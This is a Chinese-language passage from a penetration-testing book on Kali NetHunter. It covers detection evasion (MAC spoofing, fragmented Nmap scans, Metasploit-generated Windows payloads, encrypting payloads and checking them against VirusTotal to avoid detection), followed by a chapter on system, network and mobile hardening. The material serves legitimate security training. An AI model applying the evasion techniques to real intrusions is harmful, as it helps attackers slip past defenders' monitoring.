通过运行**`macchanger –-help`**命令，您将获得以下截图：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/96309cfe-c991-4aab-a921-fd0c705d81bc.jpg)

如您所见，生成随机 MAC 地址以隐藏您的身份的可能性非常容易。

# 分段

黑客和渗透测试人员用来避免被检测的另一种方法是**分段**。分段将消息（数据包）分成小块。由于这些消息的小片段通常能够绕过几乎所有用于主动观察网络流量和安全威胁的安全设备和监控工具，因此这些片段被放入网络中。

在分段攻击中，攻击者可以修改防火墙或**入侵防范系统**（IPS）中每个比特发送的**生存时间**（TTL）或超时值。这将导致安全设备不容易检测到威胁，并在重新组装过程中混淆设备。

攻击者可以向受害者机器发送有效负载的片段，并使其重新组装成有效负载，而完全不被检测到。

Nmap 允许我们对目标设备进行分段的端口扫描。我们可以使用`nmap –f <目标 IP 地址>`命令：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/f8413471-feef-4770-a437-0107b90f3812.png)

使用 Wireshark，我们可以看到每个探测被分成较小的片段，然后发送到目标。

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/3e5df8af-4406-48e4-bec6-9adabd477673.png)

这种技术可以降低网络中存在 IDS、IPS 或防病毒软件时被检测到的几率。

# Metasploit 有效负载生成器

在本书中，我们涵盖了各种主题和工具。Kali NetHunter 平台中的一个特定工具是**Metasploit Payload Generator**。这个工具的名称基本上描述了它的功能：使用 Metasploit 框架生成有效负载。在 Kali NetHunter 中打开应用程序后，我们会看到以下内容：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/90757476-f1c2-4cd4-8e34-5bef47d595cd.jpg)

如您所见，我们可以选择要生成的有效负载类型、IP 地址和端口号，以及其他有效负载选项。如果我们点击**类型**的下拉菜单，我们将看到以下选项：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/4c794b0f-60e7-448d-bde4-44fe0f01db66.jpg)

有许多不同的类型可供选择。利用此功能的一个示例是，如果要为 Microsoft Windows 系统创建有效负载，则可以选择 Windows (.exe)类型。这将使目标/受害设备（在本例中是 Windows 操作系统）相信`.exe`文件是可信的，因为它看起来像是本机可执行文件。

根据渗透测试的目标操作系统和目标，渗透测试人员可以在上述截图中看到多个选项。

# 加密流量

大多数组织会部署**IPS**来主动监视出站和入站流量，特别关注本地或其他类型的安全威胁中的任何恶意流量。

一种规避 IPS 和反恶意软件系统的技术是使用加密。大多数防火墙默认情况下无法检测加密数据包中的恶意软件。然而，下一代防火墙具有一个称为深度数据包检查（DPI）的功能，通常会解开每个数据包的内容，并对其进行扫描和分析。如果没有检测到威胁，它会重新打包并将数据包发送到目的地。如果检测到威胁，防火墙将对其进行隔离，并在其管理控制台界面和任何其他日志记录系统上发送警报。

此外，大多数 IPS 没有解密消息以查看其内容的能力。这将允许攻击者加密恶意有效载荷并通过 IPS 设备而不被检测到。以下图表显示了公司网络的典型设置；如果防火墙上禁用了 DPI，它将允许加密文件（恶意有效载荷）通过：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/a93f7ea6-e300-4ac0-896b-bb75f97967b0.jpg)

渗透测试人员可以使用 VirusTotal 网站（www.virustotal.com）来测试其加密的有效载荷在各种反恶意软件引擎中的检测水平。作为渗透测试人员的目标是确保您的有效载荷在所有或大多数反恶意软件程序中都是不可检测的。通过修改有效载荷的编码，我们还可以降低检测水平。

# 总结

在本章中，我们讨论了一些渗透测试人员可以使用的避免检测的技术，例如欺骗 MAC 地址和扫描目标而不暴露我们的真实身份。然而，渗透测试人员不应该局限于仅使用本章提到的技术和方法。作为渗透测试领域的网络安全专业人员，攻击者可以尝试各种无限的方式来保持隐秘，这是一个很棒的地方。

在下一章中，我们将介绍加固技术和对策。在那里，您将学习如何保护 Windows、Linux 和移动操作系统。


# 第十章：加固技术和对策

进入渗透测试和攻击性安全领域总是非常令人兴奋的；学习如何在系统和网络上进行利用的艺术是很有趣的。有时，你的职业道路可能会从侵入客户网络转向协助组织保护其网络基础设施免受黑客和其他潜在威胁。在过去的几年里，每天都有很多网络攻击被报告。让我们不要忘记那些没有在本地网络中报告网络攻击的组织，因为他们试图保护自己的组织声誉，最后，那些尚未在其网络上检测到入侵的组织。

通常情况下，组织会创造工作岗位来雇佣新的网络安全专业人员，但职称和工作描述并不完全符合渗透测试，而更多地是作为安全管理员或安全工程师。这些角色通常包括紫队的功能，如在第二章中提到的，*了解渗透测试过程的各个阶段*。紫队是红队和蓝队的结合，他们在网络安全中既扮演攻击方又扮演防御方，以侦测、缓解和实施组织中的网络攻击的对策。

在本章中，我们将学习各种加固技术，以提高系统的安全性。此外，我们将看看组织可以在其基础设施上实施的对策，以预防和缓解网络攻击。

在我们即将结束这本书时，对于渗透测试人员来说，了解不同平台上的加固和缓解技术同样重要，以防范安全威胁并降低风险。

在本章中，我们将涵盖以下主题：

+   常见的安全威胁

+   保护网络设备

+   保护客户操作系统

+   保护服务器操作系统

+   保护移动设备平台

让我们开始吧！

# 安全威胁和对策

在本节中，我们将看看各种安全威胁以及如何实施对策。

# 病毒

病毒是一种恶意代码，旨在对系统（如计算机）造成伤害。通常情况下，病毒不会自行执行，而是需要人的操作；这种操作可以通过简单地点击或运行感染病毒的文件来完成，这将触发恶意代码的执行。

一个显著的病毒类型被称为**蠕虫**。蠕虫是一种自我复制的病毒，可以在网络中传播，无需人类的帮助。

想象一下创建一个可以自我复制而无需用户交互并且占用系统资源如此之多以至于一个感染蠕虫的系统几乎无法使用的程序。一旦蠕虫病毒被创建并且其自我复制的过程被触发，清除网络就变得非常困难。

为了防止病毒和蠕虫的恶意软件感染，建议在所有主机设备（如台式机和服务器系统）上启用端点保护，如防病毒或反恶意软件保护。然而，确保每个防病毒客户端始终使用最新的病毒定义非常重要，以最大程度地保护主机。

以下是一些防病毒软件供应商：

+   ZoneAlarm

+   卡巴斯基实验室

+   Bitdefender

+   Avast

+   赛门铁克

以下是 ZONEALARM Extreme Security 用户界面的截图：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/48d94862-ccb8-440b-856d-9d1c340a1b5f.png)

您可能想知道是否有必要购买商业防病毒软件来获得保护。在 Microsoft Windows 平台上，有一个由微软创建的内置/预装的反恶意软件保护，称为**Windows Defender**，而且是免费的。Windows Defender 提供对各种威胁的实时保护。以下屏幕截图显示了 PC 状态：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/41dc82c0-4238-48c9-bf7b-de5db3913b53.png)

近年来，加密恶意软件在数字世界中出现，并对全球许多系统造成了重大破坏，因为几乎没有人准备好防范或减轻这种新型威胁；这种恶意软件被称为**勒索软件**。勒索软件的目标非常简单：一旦受害系统被感染，恶意软件会加密整个系统，使其不稳定，并将磁盘驱动器上的数据作为人质，直到支付赎金为止。然而，用于加密受害者系统磁盘驱动器的加密密钥经常更改，以防止受害者解密驱动器并删除勒索软件。以下是受害者系统上*WannaCry*勒索软件变种的屏幕截图：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/3bb34cfc-3704-4c89-be3e-ebb8405c6293.png)

感染了勒索软件后，受害者系统上唯一显示的窗口是付款界面。组织中最有价值的资产之一是数据。黑客看到了数据的价值，因此创建了加密恶意软件来劫持这一特定资产。然而，不建议支付赎金，我们知道数据非常有价值，可能包含重要的财务记录和敏感信息。一旦受害者提供他们的信用卡信息，就绝对不能保证攻击者会提供解密密钥；相反，他们可能会从受害者的信用卡中窃取资金。

许多威胁情报和预防公司，如 Check Point Software Technologies ([`www.checkpoint.com/`](https://www.checkpoint.com/))、卡巴斯基实验室 ([`www.kaspersky.co.in/`](https://www.kaspersky.co.in/)) 和 Bitdefender ([`www.bitdefender.com/`](https://www.bitdefender.com/))，已开发了反勒索软件保护，以帮助防止和解密受感染的系统。

以下是 ZoneAlarm 反勒索软件客户端的屏幕截图：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/7ceca56a-e7f5-4bf7-b6f3-2b7106a6c11a.png)

一旦系统安装了反勒索软件保护，它会在检测到互联网连接后自动更新。如果勒索软件企图在本地系统上安装自己，反勒索软件保护将对系统进行消毒，并解密勒索软件影响的任何文件。

保护免受勒索软件的对策包括以下内容：

+   在客户系统上安装反勒索软件保护。

+   定期备份数据。

+   在操作系统上安装最新更新。

+   保持防病毒应用程序的更新。

# 其他常见病毒

以下是一些其他常见的病毒：

+   **特洛伊木马**：特洛伊木马病毒伪装成看起来像合法软件或应用程序，但其核心内部包含恶意载荷。其目的是欺骗受害者在其系统上运行该应用程序；一旦特洛伊木马被执行，恶意载荷将在用户不知情的情况下在后台卸载自己。一些特洛伊木马被用于为黑客创建*后门*，以非法进入受害者系统，这些被称为**远程访问特洛伊木马**（**RATs**）。

+   **间谍软件**：间谍软件是一种安装在受害者系统上的病毒，它收集用户的活动等信息，并将信息发送回其创建者。间谍软件的一个例子是潜伏在受害者系统上并收集用户按键的**键盘记录器**。

+   **Rootk****its**：Rootkit 病毒的主要目标是成为计算机内核的一部分。Rootkits 通常对操作系统和防病毒应用程序是不可见的。其目的是在受害者计算机上获得根级别权限，这将使恶意软件在系统上具有完全访问权限，从而可以执行任何操作。

恶意软件通常通过以下媒介进行分发：

+   电子邮件

+   网络文件共享

+   互联网或驱动器下载

+   社会工程学

以下是一些恶意软件的对策和缓解措施：

+   在所有系统上安装防恶意软件保护。

+   确保防恶意软件应用程序始终保持最新。

+   定期在所有系统上运行病毒扫描。

+   在操作系统上安装最新的更新。

+   在电子邮件服务器上启用垃圾邮件过滤。

+   不要点击任何可疑的电子邮件消息或网址。

# 客户端系统安全

在本节中，我们将重点关注保护操作系统。在组织中，IT 部门通常为每个独特的系统制定基线。安全基线规定了应如何安装和配置操作系统，以确保满足安全要求。

操作系统的安全基线通常包括以下内容：

+   在操作系统上禁用任何不必要的服务。

+   定期安装系统更新和补丁。

+   强制执行密码复杂性策略。

+   禁用或删除任何不必要的用户帐户。

+   确保安装并更新端点保护，如防病毒软件。

+   启用系统日志记录以便追责。

# Windows 基线

为 Microsoft Windows 创建基线实际上非常简单。以下目标可用作建立基线的检查表：

+   操作系统安装应该在磁盘驱动器上的单个分区上使用 NTFS 文件系统进行。

+   安装最新的补丁并启用 Windows 自动更新，以确保所有漏洞得到相应的修补。

+   启用和配置 Windows 防火墙。

+   安装并更新防病毒保护。

+   禁用任何不必要的服务。

基线是未来参考的起点，可用作测量过程或系统是否在正常容量内运行的依据。

**Microsoft 基线安全分析器**（**MBSA**）允许系统管理员和安全专业人员扫描本地系统或基于 Windows 的系统网络，以查找任何安全配置错误。

MBSA 可以在[`www.microsoft.com/en-us/download/details.aspx?id=19892`](https://www.microsoft.com/en-us/download/details.aspx?id=19892)找到。

采取以下步骤创建基线：

1.  安装 Microsoft 基线后，打开应用程序。您将看到以下窗口：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/f3406b42-78f6-4bea-addd-ad06c757a5e4.png)

1.  单击“扫描计算机”。您可以选择使用计算机的主机名或 IP 地址作为扫描目标。在本练习中，我们将使用计算机名称字段中的默认主机名。

1.  单击“开始扫描”，如下面的屏幕截图所示：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/813e826d-dc97-48f1-8c38-ee73235777bf.png)

1.  结果将自动填充到新窗口中，如下面的屏幕截图所示：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/ac62be8d-1163-4be4-8d02-e57687c556e3.png)

结果将指示需要系统管理员关注的各种安全问题和配置错误。检测到的每个问题都会被赋予严重性评级，以便轻松识别系统上最关键的安全问题。

# Windows 注册表

Windows 注册表存储了系统的所有配置和记录-从系统启动到关闭的所有操作。注册表，更为人所知的是蜂房，通过使用注册表键来维护其记录。蜂房是注册表中的一组逻辑键、子键和值，具有包含其数据备份的一组支持文件。注册表是一个包含对 Windows 操作和在 Windows 上运行的应用程序和服务至关重要的数据的分层数据库。每个操作、配置、任务等都有一个唯一的键。监视任何异常变化或活动可以帮助检测安全妥协。监视和审计 Windows 注册表的一个工具是进程监视器：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/9a57e444-2edb-48f7-bc4b-3304f23bff66.png)

进程监视器是微软的 Sysinternals 工具套件的一部分。要下载进程监视器，请访问[`docs.microsoft.com/en-us/sysinternals/downloads/procmon`](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)。

# 用户帐户

系统上的每个用户都应该有自己的用户帐户，但有时用户不再在组织中或已经转移到另一个部门或位置，他们的用户帐户仍然在特定系统上启用。在系统上禁用不必要的用户帐户是良好的安全实践。

要在 Windows 上禁用用户帐户，打开控制面板|用户帐户|管理帐户。

在 Microsoft Windows 上禁用或删除访客帐户。这可以防止用户使用访客用户帐户访问您的计算机。

# 补丁管理

补丁管理过程包括以下目标：

+   使用工具自动检测更新和补丁。

+   进行漏洞评估，以确定其严重程度和需要补救问题的补丁。

+   获取解决安全问题所需的补丁。

+   在非生产机器上测试补丁，以确定安全问题是否已解决。

+   将经过测试的补丁部署到组织内的系统。

+   维护所有系统。

Microsoft Windows 提供了一个选项，可以自动下载和安装更新、补丁和服务包。要调整 Windows Update 的选项，导航到控制面板|Windows Update|更改设置：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/807d5c6e-98f7-49c5-b97a-9c3ce1645d06.png)

# Windows 防火墙

Microsoft Windows 操作系统具有内置防火墙，可防止恶意流量进入和离开本地系统。要确保 Windows 防火墙已启用，请导航到控制面板|Windows 防火墙，如下图所示：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/2c76a7c0-b039-4f78-9efe-d1ef853fade2.png)

要调整配置，例如在防火墙上创建、修改或删除规则，请单击高级设置，如下图所示：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/4399a95e-164a-470e-af6b-552e59f00143.png)

# 禁用服务

在操作系统上使用未使用的服务可能会成为潜在的安全风险，因为攻击者可以尝试利用运行服务中的漏洞来破坏系统。在操作系统上禁用任何不必要的服务非常重要。

以下是一个非全面的服务列表，如果不使用应该禁用：

+   文件传输协议（FTP）

+   Telnet

+   通用即插即用（UPnP）

+   SQL Server

+   Internet 信息服务（IIS）

要在 Microsoft Windows 上禁用服务，打开控制面板|管理工具|服务：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/8cd545c4-ae02-48ec-a75e-1ccd0361f12d.png)

您可以启动、停止和重新启动任何可用的服务。要进行修改，只需双击服务：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/513faeed-4b19-4493-b793-20250febb50f.png)

# Linux 基线

正如我们在前一节中所学到的，安全基线通常涉及创建允许安全、轻松部署机器的映像。以下是为 Linux 操作系统创建安全基线的指南：

+   确保 Linux 操作系统始终使用最新的安全补丁。可以使用`yum update`或`apt-get update && apt-get upgrade`命令执行此操作。

+   确保执行强密码策略。

+   禁用任何未使用的服务。

+   启用磁盘加密。

+   启用日志记录和审计。

+   配置防火墙策略。

+   禁用 USB 设备。

+   保护 Web 服务。

+   创建备份和保留策略。

+   避免使用不安全的服务，如 HTTP、Telnet 和 FTP。

Linux 和 Windows 安全策略在两个操作系统上可以互换使用。

# Linux 的安全扫描程序

**Buck-security** ([`www.buck-security.net/buck-security.html`](http://www.buck-security.net/buck-security.html))是专为基于 Ubuntu 和 Debian 的 Linux 操作系统设计的安全扫描程序。

要安装 buck-security，您需要从其官方 GitHub 存储库下载文件。使用`git clone https://github.com/davewood/buck-security`命令执行此功能，如下面的屏幕截图所示：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/ab4ec73f-ff9f-427a-9cc4-ccc170037a0a.png)

接下来，使用`cd buck-security`命令将目录更改为`buck-security`文件夹。一旦进入`buck-security`目录，您可以执行工具对本地系统进行安全审计。要执行此实用程序，请使用`./buck-security`命令，如下面的屏幕截图所示：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/e85a3718-d844-4615-a6f0-1f551ec7cad4.jpg)

**Lynis**是另一个安全审计和合规性工具，专为 Linux 和 macOS 操作系统设计。它具有在本地或远程系统上执行安全审计和非特权扫描的能力。根据开发人员的说法，Lynis 通常用于安全审计、合规性测试、渗透测试、漏洞评估和系统加固。

有关 Lynis 的更多信息，请访问其官方网站：[`cisofy.com/lynis`](https://cisofy.com/lynis)。

要开始使用 Lynis，您需要使用`git clone https://github.com/CISOfy/lynis`命令从官方 GitHub 存储库下载项目文件。

接下来，使用`cd lynis`命令将目录更改为`lynis`文件夹。

要执行本地安全扫描，我们可以简单地使用`./lynis audit system`或`lynis audit system`命令。

要执行远程安全扫描，请使用`lynis system remote <远程主机的 IP 地址>`命令。

要执行非特权扫描（对于渗透测试很有用），请使用`lynis --pentest`命令：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/40eb922c-2797-44cf-af86-8a2cee8e8fbc.jpg)

# 在 Linux 中禁用服务

要在基于 Linux 的系统上确定运行的服务，`ps ax`命令将显示当前正在运行的服务列表及其 PID，如下面的屏幕截图所示：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/25ffd561-ab13-4183-baff-45b6edf554b0.png)

正如我们所看到的，PID 列出了它们对应的服务。您可能被要求停止或终止服务；要立即在本地系统上终止服务，请使用`kill -9 <PID>`命令。

假设您想要查看具有`firefox`字符串的任何运行服务/进程-使用`ps –A |grep firefox`命令：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/4176c3e4-fd53-4600-a7d9-5c97c85ad196.png)

输出显示`firefox-esr`服务当前正在本地系统上运行，使用`2340` PID。我们可以使用 PID 和`kill`命令终止此服务，如下面的屏幕截图所示：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/f019b51d-0843-44da-acec-a05497c7823a.jpg)

在 Linux 中确定运行的服务的另一个实用程序是`netstat`命令。使用`netstat –lp`命令将显示当前处于监听状态的网络协议及其对应的程序：

![image](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-pentest-kali-nthtr/img/8994be9a-b88a-4475-a0c6-2c0f9b630d95.png)

使用`update-rc.d –f <server-name> remove | stop`命令将在 Linux 中禁用不需要的服务。

# 加固网络设备

为了最小化路由器的攻击面，使用以下清单：

+   更改所有默认密码。

+   创建强密码。

+   禁用 HTTP 服务器及其配置。

+   禁用 ping 响应，如 ICMP 回显回复。

+   为流量过滤应用**访问控制列表**（**ACLs**）。

+   禁用不安全的服务，如 Telnet。

+   将固件和操作系统更新到最新的稳定版本。

+   禁用不必要的服务。

以下清单可用作加固交换机的基础：

+   应用端口安全。

+   强制执行密码策略以获得强密码和复杂性。

+   使用 SSH 而不是 Telnet。

+   禁用**动态中继协议**（**DTP**）。DTP 使链接自动成为中继。

+   不要使用 VLAN 1。

+   启用生成树根守卫和 BPDU 守卫。

+   启用 DHCP 监听。

# 加固移动设备

有时，在讨论智能手机的话题时，我们会听到一个 Android 用户提到他们已经*rooted*他们的设备。什么是 rooting？在 Android 生态系统中，*rooting*是指在移动设备上获得根级别访问权限。与 Linux 一样，root 用户帐户被认为是系统上具有超级/完整权限的用户；由于 Android 是基于 Linux 的，获得完整的管理权限被称为**rooting**。

拥有完全访问权限的设备非常棒，这意味着您可以安装和修改应用程序和系统资源以满足您的需求。然而，对于 Android 用户来说，rooting 会带来许多安全风险。首先，如果设备被 rooted，设备的保修将变为无效，而且更容易感染恶意软件。在 rooting 过程中，设备可能会变得无法使用，或者 Android 用户所说的*砖化*（无法使用）。虽然用户可以在 rooted 设备上安装和修改系统，但这会阻止 Android 设备接收和/或安装来自制造商的**空中**（**OTA**）更新。

系统更新对于任何设备都非常重要，无论是台式机、服务器、路由器、交换机、防火墙还是智能设备，如智能设备。系统更新是为了修复错误和安全问题而创建和推出的。因此，rooted 设备更容易受到威胁。

类似于对 Android 设备进行 root 以获得完整/超级用户权限，对于苹果设备来说，相应的术语是*越狱*。越狱为移动用户提供了根级别的权限，并允许您从苹果应用商店之外的来源下载应用程序。

以下是为 Android 和 iOS 设备开发安全检查清单/基线的指南：

+   确保操作系统保持最新。

+   不要 root Android 设备。

+   只从官方应用商店下载和安装移动应用程序，如 Google Play 商店和苹果应用商店。

+   从受信任的安全供应商下载并安装防病毒应用程序。

+   确保启用锁屏。

+   确保您的 iPhone/iPad 或 Android 设备上启用了密码锁。

+   确保更改默认密码。

+   在 Web 浏览器中禁用附加组件和 JavaScript。

# 总结

在本章中，我们讨论了常见的安全威胁以及可能的对策和缓解技术。我们讨论了组织内系统安全基线的需求，并研究了一些工具，帮助我们在 Windows 和 Linux 操作系统上测量安全风险。然后，我们讨论了网络设备（如路由器和交换机）的各种加固技术，并最后学习了加固移动设备。

在下一章中，我们将探讨为实验室构建环境。
